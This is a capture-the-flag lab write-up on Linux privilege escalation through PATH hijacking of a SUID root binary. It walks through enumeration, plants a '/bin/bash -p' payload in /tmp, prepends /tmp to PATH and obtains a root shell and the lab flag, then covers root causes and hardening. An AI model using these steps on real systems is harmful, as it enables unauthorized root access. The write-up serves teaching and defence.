<img src="https://raw.githubusercontent.com/01SIRIUS10/01SIRIUS10/main/Banner.png" width="100%" alt="SIRIUS Banner" />

# Lab 08: PATH Variable Manipulation & Binary Hijacking

| Metadata | Details |
| :--- | :--- |
| **Lab Name** | Linux Privilege Escalation — Task 10: PATH Variable Abuse |
| **Target OS** | Ubuntu Linux / Debian-based |
| **Difficulty** | Medium |
| **Category** | Privilege Escalation / Execution Flow Hijacking / Environment Manipulation |
| **Tools Used** | `find`, `echo`, `export`, `chmod`, `strings`, `bash` |
| **Key Concepts** | `$PATH` Resolution Precedence, Relative Command Invocations, `system()` vs `execve()`, SUID Privilege Drops (`-p`), Binary Dropping |

---

## 🎯 Goal
Identify an anomalous SUID root binary invoking an unanchored, relative executable name (`thm`). Exploit the Linux environment `$PATH` resolution algorithm by prepending an attacker-controlled writable directory, planting a malicious executable payload, and capturing an elevated UID 0 interactive shell to recover `flag6.txt`.

---

## 🧠 Concept & Architecture

The `$PATH` environment variable is an ordered, colon-separated list of directory paths that the shell interrogates sequentially to locate executable binaries invoked without absolute path definitions.

```
+-----------------------------------------------------------------------------------------+
|                         $PATH Resolution & Hijacking Mechanics                          |
+-----------------------------------------------------------------------------------------+
|                                                                                         |
|   1. Attacker Environment Modification                                                  |
|   +---------------------------------------------------------------------------------+   |
|   | Original PATH : /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin    |   |
|   | Manipulated   : export PATH=/tmp:$PATH                                          |   |
|   | Updated PATH  : /tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:...      |   |
|   +---------------------------------------------------------------------------------+   |
|                                       │                                                 |
|                                       ▼                                                 |
|   2. SUID Binary Execution Context: /home/murdoch/test                                  |
|   +─────────────────────────────────────────────────────────────────────────────────+   |
|   | Permissions   : -rwsr-xr-x root root (Effective UID = 0)                        |   |
|   | Internal Code : system("thm") -> Invokes /bin/sh -c "thm"                       |   |
|   +─────────────────────────────────────────────────────────────────────────────────+   |
|                                       │                                                 |
|                                       │ Shell Traverses $PATH from Left to Right        |
|                                       ▼                                                 |
|   3. Execution Precedence Interception                                                  |
|   +─────────────────────────────────────────────────────────────────────────────────+   |
|   | First Check   : /tmp/thm  ──> [MATCH FOUND & EXECUTED AS ROOT]                  |   |
|   | System Paths  : /usr/bin/thm (Never Reached)                                    |   |
|   | Payload Action: /bin/bash -p spawns root shell preserving EUID 0                |   |
|   +─────────────────────────────────────────────────────────────────────────────────+   |
|                                                                                         |
+-----------------------------------------------------------------------------------------+
```

### 1. Left-to-Right Precedence Rule
When a command is executed without an absolute prefix (`/`), the shell evaluates directory paths strictly from left to right:
* If a directory at the beginning of `$PATH` contains an executable matching the requested name, execution triggers immediately.
* Remaining directories are discarded.
* Prepending (`export PATH=/tmp:$PATH`) guarantees that user-controlled directories supersede trusted system directories (`/bin`, `/usr/bin`).

### 2. Dangerous Programmatic Execution: `system()` vs `execve()`
* **Vulnerable Pattern (`system("thm")`):** Spawns a subshell (`/bin/sh -c`) that inherits the calling user's runtime environment, including the manipulated `$PATH`.
* **Secure Pattern (`execve("/usr/bin/thm", ...)`):** Interacts directly with the kernel syscall interface, executing a strictly hardcoded absolute path without shell parsing or environment variable dependency.

### 3. SUID Privilege Preservation (`bash -p`)
Modern implementations of `/bin/bash` detect when the Real User ID (RUID) does not match the Effective User ID (EUID). By default, Bash drops elevated privileges back to the calling user. Passing the `-p` (privileged) flag forces Bash to maintain EUID 0 and prevent credential shedding.

---

## 🔍 Enumeration

### 1. Inspecting Default Session Environment
Reviewing the current `$PATH` variable structure:

```bash
echo $PATH
```

**Example output:**
```text
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
```

### 2. Auditing Writable Directory Anomalies
Searching for directories outside standard temporary storage where the current user (`karen`) maintains write permissions:

```bash
find / -writable -type d 2>/dev/null | grep -v "/proc" | grep -v "/sys" | grep -v "/home/karen"
```

**Example output:**
```text
/run/user/1001
/tmp
/dev/shm
/home/murdoch
/var/tmp
```

**Key Finding:**
`/home/murdoch` is world-writable or permits write delegation to group/other users, indicating a severe Discretionary Access Control (DAC) misconfiguration.

### 3. Auditing SUID Binaries
Auditing the target system for non-standard administrative binaries:

```bash
find / -type f -perm -04000 2>/dev/null
```

**Example output:**
```text
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/mount
/home/murdoch/test
```

**Key Finding:**
An anomalous custom binary `/home/murdoch/test` possesses SUID permissions (`-rwsr-xr-x`) owned by `root`.

### 4. Reverse Engineering Binary String Artifacts
Interrogating the compiled ELF binary for embedded ASCII strings to identify invoked system commands:

```bash
strings /home/murdoch/test
```

**Example output:**
```text
/lib64/ld-linux-x86-64.so.2
libc.so.6
setuid
system
__cxa_finalize
__libc_start_main
thm
GLIBC_2.2.5
```

**Triage Analysis:**
* The binary invokes `setuid(0)` followed by `system()`.
* The utility argument passed to `system()` is the bare string `thm` rather than a fully qualified absolute path (`/usr/bin/thm`).

---

## 💥 Exploitation Workflow

### Phase 1: Payload Construction & SUID Shell Dropper
Create an arbitrary executable named `thm` within a writable directory (`/tmp`) containing a privileged shell execution payload:

```bash
echo "/bin/bash -p" > /tmp/thm
chmod +x /tmp/thm
```

Verify the payload file structure:
```bash
ls -la /tmp/thm && cat /tmp/thm
```

**Example output:**
```text
-rwxr-xr-x 1 karen karen 13 Nov 26 21:55 /tmp/thm
/bin/bash -p
```

### Phase 2: Manipulating `$PATH` Precedence
Prepend `/tmp` to the active session's `$PATH` variable so the shell interrogates `/tmp` before system paths:

```bash
export PATH=/tmp:$PATH
```

Validate the modified environment:
```bash
echo $PATH
```

**Example output:**
```text
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games
```

### Phase 3: Triggering Hijacked Execution Flow
Invoke the vulnerable SUID binary `/home/murdoch/test`:

```bash
/home/murdoch/test
```

The binary executes as `root`, calls `system("thm")`, resolves `/tmp/thm` due to manipulated path precedence, and executes `/bin/bash -p`.

Validate elevated UID context:
```bash
id
```

**Example output:**
```text
uid=1000(karen) gid=1000(karen) euid=0(root) groups=1000(karen)
```

### Phase 4: Target Flag Harvesting
With administrative root authority confirmed, locate and extract `flag6.txt`:

```bash
find / -name "flag6.txt" 2>/dev/null
```
```bash
cat /home/ubuntu/flag6.txt
```

**Example output:**
```text
THM-736628929
```

---

## 🧬 Root Cause Analysis

### 1. Insecure Execution via Relative Invocations
The developer utilized `system("thm")` inside `/home/murdoch/test`. Because no absolute path was hardcoded, the system delegated binary location to the caller's environment variable `$PATH`, effectively ceding execution control to an unprivileged user.

### 2. Subshell Environment Inheritance
`system()` invokes `/bin/sh -c`, which inherits all exported process environment variables. While SUID executables ignore certain dynamic loader variables (e.g., `LD_PRELOAD`), `$PATH` remains inherited by child subshells unless explicitly sanitized by the application.

### 3. Permissive Directory Permissions
`/home/murdoch` possessed permissive write permissions for low-privileged users, allowing external file dropping and manipulation inside home directory structures.

---

## 🛡️ Remediation & Hardening

### 1. Secure Coding Standards: Enforce Hardcoded Absolute Paths
Eliminate calls to `system()` within privileged applications. Replace with direct kernel executions using `execve()` and hardcoded absolute paths:
```c
// Hardened implementation
#include <unistd.h>

int main() {
    setuid(0);
    char *args[] = {"/usr/bin/thm", NULL};
    char *env[] = {NULL};
    execve("/usr/bin/thm", args, env);
    return 0;
}
```

### 2. Sanitize Environmental Variables at Program Initialization
If a shell or system utility must be invoked, sanitize `$PATH` at the entry point of the binary:
```c
setenv("PATH", "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", 1);
```

### 3. Enforce Sudo `secure_path`
Ensure that administrative delegations managed via `/etc/sudoers` enforce fixed search paths regardless of caller environment variables:
```text
Defaults secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
```

### 4. Restrict Home Directory DAC Masks
Ensure user home directories are strictly private and not world-writable:
```bash
sudo chmod 700 /home/*
```

---

## 📝 My Lab Notes

* **Prepend vs. Append:** The syntax `export PATH=/tmp:$PATH` (prepending) is mandatory. Appending (`export PATH=$PATH:/tmp`) places the payload directory at the end of the search chain, causing legitimate system utilities to trigger first if a binary with the same name exists.
* **Execution Mask Pitfall:** Forgetting `chmod +x` on the dropped payload causes the shell to return `Permission denied`, breaking the attack chain.
* **Privilege Drop Evasion:** Using `/bin/bash` without `-p` results in privilege shedding where EUID reverts to 1000 (`karen`).

---

## 💡 Key Takeaways
* Never trust environmental variables in privileged security contexts.
* Unanchored relative command calls inside SUID binaries are equivalent to arbitrary code execution.
* Inspecting compiled binaries with `strings` provides immediate visibility into underlying system calls and binary targets.

---

<p align="center">
  <a href="07-cron-jobs.md">⬅️ Previous: Cron Jobs</a> •
  <a href="09-nfs-root-squash.md">➡️ Next: NFS Root Squashing</a>
</p>
